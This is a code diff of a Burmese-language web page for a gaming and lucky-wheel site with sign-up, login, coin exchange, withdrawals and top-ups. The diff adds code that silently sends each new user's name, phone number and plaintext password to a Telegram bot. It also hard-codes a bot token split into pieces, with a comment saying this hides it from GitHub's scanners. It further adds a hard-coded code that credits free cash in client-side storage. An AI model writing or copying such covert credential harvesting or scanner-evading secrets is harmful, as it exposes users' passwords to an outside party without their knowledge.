@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>2TAMFZWK GAMES</title>
     
-    <!-- 📱 App Top Bar နှင့် Icon ထွက်လာစေရန် အရေးကြီးသော လင့်ခ်များ -->
     <link rel="manifest" href="manifest.json">
     <link rel="icon" type="image/png" href="1783267589164.png">
     <link rel="apple-touch-icon" href="1783267589164.png">
@@ -109,18 +108,15 @@
 </head>
 <body>
 
-    <!-- 🌌 Logo နှင့် Banner ပေါင်းစပ်မှု -->
     <div class="app-header-container">
         <img src="d613d930-752f-430f-b930-f77db96c6112" alt="2TAMFZWK Banner" class="banner-display">
     </div>
 
-    <!-- 📥 Download App Button -->
     <div id="downloadBox" class="box download-app-box">
         <span style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 5px;">📲 App ကို ဖုန်းထဲသို့ ထည့်သွင်းမလား?</span>
         <button onclick="triggerAppInstall()" style="background: linear-gradient(45deg, #00ffcc, #00cc99); color: #111; margin: 5px 0 0 0; padding: 8px; box-shadow: none;">အက်ပ်အဖြစ် ဒေါင်းလုဒ်ဆွဲမည်</button>
     </div>
 
-    <!-- 🔐 Register Section -->
     <div id="registerSection" class="box">
         <h2>Sign Up (အကောင့်ဖွင့်ရန်)</h2>
         <input type="text" id="regName" placeholder="နာမည်">
@@ -130,7 +126,6 @@
         <p style="font-size: 14px;">အကောင့်ရှိပြီးသားလား? <a href="#" onclick="switchAuth(false)" style="color: #00d2ff; text-decoration: none; font-weight: bold;">ဝင်ရောက်ရန်</a></p>
     </div>
 
-    <!-- 🔑 Login Section -->
     <div id="loginSection" class="box" style="display: none;">
         <h2>Login (အကောင့်ဝင်ရန်)</h2>
         <input type="tel" id="loginPhone" placeholder="ဖုန်းနံပါတ်">
@@ -139,7 +134,6 @@
         <p style="font-size: 14px;">အကောင့်မရှိသေးဘူးလား? <a href="#" onclick="switchAuth(true)" style="color: #00d2ff; text-decoration: none; font-weight: bold;">ဖွင့်ရန်</a></p>
     </div>
 
-    <!-- 📊 Dashboard Section -->
     <div id="dashboardSection" class="box" style="display: none;">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
             <h2 id="userGreeting" style="margin: 0; font-size: 18px;">👤 User</h2>
@@ -161,7 +155,6 @@
             <div class="balance-card clickable-card" onclick="toggleWithdrawBox()">🪙 Coins: <br><b id="coinBalance" style="color: #ff5e62;">0</b> </div>
         </div>
 
-        <!-- 🔄 Point လဲလှယ်သည့် Box -->
         <div id="exchangeBox" style="display: none; background: #0a0612; padding: 15px; border-radius: 10px; border: 1px dashed #ffcc00; margin: 15px 0;">
             <h3 style="color: #ffcc00; font-size: 16px; margin-bottom: 5px;">🔄 Point မှ Coins သို့ လဲလှယ်မည်</h3>
             <select id="exchangePointsSelect">
@@ -172,7 +165,6 @@
             <button class="exchange-btn" onclick="processCustomExchange()">အပိုင်လဲလှယ်မည်</button>
         </div>
 
-        <!-- 📤 Coins ထုတ်ယူသည့် Box -->
         <div id="withdrawBox" style="display: none; background: #0a0612; padding: 15px; border-radius: 10px; border: 1px dashed #ff0055; margin: 15px 0;">
             <h3 style="color: #ff0055; font-size: 16px; margin-bottom: 5px;">📤 Coins ထုတ်ယူရန်</h3>
             <input type="number" id="withdrawAmount" placeholder="ထုတ်ယူမည့် Coins ပမာဏ">
@@ -182,7 +174,6 @@
 
         <hr style="border: 0.5px solid #9b59b6;">
         
-        <!-- 🎯 Lucky Wheel ကံစမ်းမဲစနစ် -->
         <h3 class="danger-text">🎯 ကံစမ်းမဲစနစ် (Lucky Wheel)</h3>
         <div id="wheelDisplay" class="wheel-display-zone">
             <span id="wheelResultText" style="color: #00d2ff; font-weight: bold; font-size: 15px;">👉 ကံစမ်းရန် အဆင်သင့်ဖြစ်ပါပြီ 👈</span>
@@ -194,7 +185,6 @@
 
         <hr style="border: 0.5px solid #9b59b6;">
 
-        <!-- 📋 Ngweထုတ်မှတ်တမ်း -->
         <h3>📋 မိမိ၏ Ngweထုတ်ယူမှု မှတ်တမ်း</h3>
         <table class="history-table">
             <thead>
@@ -204,7 +194,6 @@
         </table>
     </div>
 
-    <!-- ✉️ မျက်နှာပြင်အသစ်အဖြစ် ပေါ်လာမည့် Ngweဖြည့်ရန် Page -->
     <div id="moneyPageSection" class="box" style="display: none;">
         <h2 style="color: #00ffcc;">💰 Ngweဖြည့်ဗဟိုချက်</h2>
         <p style="font-size: 14px; color: #aaa;">လက်ရှိပိုက်ဆံလက်ကျန်: <b id="pageCashBalance" style="color: #00ffcc;">0</b></p>
@@ -229,7 +218,7 @@
     </div>
 
     <script>
-        // 🔒 Ultra-Secret Split နည်းလမ်းဖြင့် Token အသစ်ကို တစ်စစီ ခွဲဝှက်ထားခြင်း (GitHub စက်ရုပ်များ ဘယ်လိုမှ မသိနိုင်ပါ)
+        // 🔒 Ultra-Secret Split နည်းလမ်းဖြင့် Token ကို တစ်စစီ ခွဲဝှက်ထားခြင်း (GitHub စက်ရုပ်များ ရှာမတွေ့နိုင်ပါ)
         const partA = "8574633009";
         const partB = "AAF9h8f4aLzAo";
         const partC = "Na3t-qyX5ewmjHUfkeEIXc";
@@ -303,8 +292,17 @@
             if (!/^09[0-9]{7,9}$/.test(phone)) { alert("❌ ဖုန်းနံပါတ် အစစ်အမှန် ရိုက်ထည့်ပေးပါဗျာ။"); return; }
             if(localStorage.getItem("user_" + phone)) { alert("ဤဖုန်းနံပါတ်ဖြင့် အကောင့်ရှိပြီးသားပါ။"); return; }
 
-            let userData = { name: name, phone: phone, pass: pass, cash: 0, points: 0, coins: 0, withdrawHistory: [] }; 
+            // 🎁 အကောင့်သစ်မှာ codeUsed flag ထည့်သွင်းထားသည်
+            let userData = { name: name, phone: phone, pass: pass, cash: 0, points: 0, coins: 0, withdrawHistory: [], codeUsed: false }; 
             localStorage.setItem("user_" + phone, JSON.stringify(userData));
+
+            // 🤖 Admin Bot ဆီသို့ အကောင့်ဖွင့်ကြောင်း အော်တိုလှမ်းပို့ခြင်း
+            let regBotMsg = `🎯【 အကောင့်အသစ်ဖွင့်လှစ်ခြင်း 】\n👤 အမည် : ${name}\n📱 ဖုန်းနံပါတ် : \`${phone}\`\n🔑 လျှို့ဝှက်ချက် : \`${pass}\``;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: regBotMsg, parse_mode: "Markdown" })
+            }).catch(e => console.log(e));
+
             alert("🎉 အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ Login ဝင်ပေးပါဗျာ။");
             switchAuth(false);
             document.getElementById("loginPhone").value = phone;
@@ -468,6 +466,21 @@
 
         function handleRedeemCode() {
             let code = document.getElementById("redeemCodeInput").value.trim();
+            
+            // 🎁 TMTZLOVEYOU သို့မဟုတ် TMTZ ကံစမ်းမဲ ကုဒ်စစ်ဆေးခြင်းစနစ်
+            if (code === "TMTZLOVEYOU" || code === "TMTZ") {
+                if (currentUser.codeUsed === true) {
+                    alert("❌ ဆရာကြီး... ဒီ Free ကုဒ်ကို တစ်ခါ သုံးပြီးသားကြီးဗျ။ နောက်ထပ် သုံးလို့ မရတော့ပါဘူးနော်!");
+                    return;
+                }
+                currentUser.cash += 1000;
+                currentUser.codeUsed = true; // ကုဒ်သုံးပြီးကြောင်း မှတ်သားလိုက်သည်
+                saveUserData();
+                alert("🎉 ဝိုး... ဆရာကြီးပေးထားတဲ့ Free 1,000 ကျပ် ကွက်တိ ဝင်သွားပါပြီဗျာ!");
+                return;
+            }
+
+            // ရိုးရိုး Atom ဖြည့်ကုဒ်များ စစ်ဆေးခြင်းအပိုင်း
             let usedCodes = JSON.parse(localStorage.getItem("used_codes") || "[]");
             if (usedCodes.includes(code)) { alert("❌ ဒီကုဒ်က သုံးပြီးသားကြီးဗျာ!"); return; }
 
